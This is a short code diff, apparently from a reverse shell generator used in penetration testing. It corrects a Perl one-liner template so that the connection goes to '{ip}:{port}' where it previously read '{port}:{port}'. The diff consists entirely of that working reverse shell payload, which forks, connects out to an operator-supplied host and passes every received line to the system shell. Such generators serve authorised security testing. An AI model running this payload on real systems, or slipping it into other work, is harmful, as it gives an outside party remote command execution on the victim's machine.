@@ -101,7 +101,7 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "Perl no sh",
-            "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{port}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+            "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
             "meta": ["linux", "mac"]
         },
         {
